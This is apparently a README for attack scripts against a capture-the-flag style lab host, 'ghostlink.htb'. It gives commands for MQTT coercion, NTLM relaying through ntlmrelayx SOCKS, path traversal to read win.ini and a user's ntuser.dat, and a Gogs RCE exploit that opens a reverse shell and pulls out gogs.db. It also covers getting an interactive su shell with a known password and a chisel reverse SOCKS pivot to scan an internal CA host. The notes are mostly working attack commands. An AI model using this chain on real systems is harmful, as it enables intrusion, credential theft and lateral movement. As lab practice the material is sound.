# Ghostlink scripts

All listeners bind **`tun0`**, never `eth0`.

## MQTT coerce

Default healthcheck topic:

```text
GhostProtocolZero/systems/node/secureshare/healthcheck
```

`$SYS/#` is broker telemetry (`127.0.0.1` / `username null`) — ignore it.

```bash
./mqtt_set_healthcheck.sh <TUN0_IP> [port]
# default port 8888 so you can leave 80 free
```

## File-share traversal

Relay NTLM to `http://gpz-op26-secure.ghostlink.htb` with SOCKS, then:

```bash
python3 encode_traversal.py '..\..\..\..\..\..\..\windows\win.ini'
python3 encode_traversal.py '..\..\..\..\..\..\..\users\svc_canary\ntuser.dat'
```

`ntlmrelayx` SOCKS needs HTTP Basic identity `GHOSTLINK/SVC_CANARY:`.  
IIS HTTP.sys: use **ghostsurf `-k -r`** rather than stock ntlmrelayx HTTP keep-alive.

## Gogs RCE

Do **not** use generic PoCs that brute `/data/gogs/...` hook paths — they 500 here.

```bash
python3 gogs_cve_2025_8110_gitconfig.py \
  --url http://gpz-op26-toolkits.ghostlink.htb \
  --user <GOGS_USER> --password '<GOGS_PASS>' \
  --lhost 10.10.14.x --lport 4444
```

Needs: `requests`, `beautifulsoup4`, `git`. Reverse-shell port ≠ `gogs.db` exfil port.

No `python3` on the Gogs host. `echo pass | su nvirelli` then `exec bash -i` **exits immediately** (pipe EOF). Use `su -c 'cmd'` or `(echo pass; cat) | su -c 'bash -i'`.

## ESC11 pivot

Chisel reverse socks (binary from your Kali, already on PATH):

```text
Kali:  chisel server -p 8001 --reverse
Box:   ./chisel client <TUN0_IP>:8001 R:1081:socks
Kali:  proxychains -f proxychains-pivot.conf -q nmap -sT -Pn -p 445 172.16.20.10
```

CA host is **internal** `172.16.20.10` (`gpz-op26-secure`). Ghostsurf SOCKS is not this tunnel.
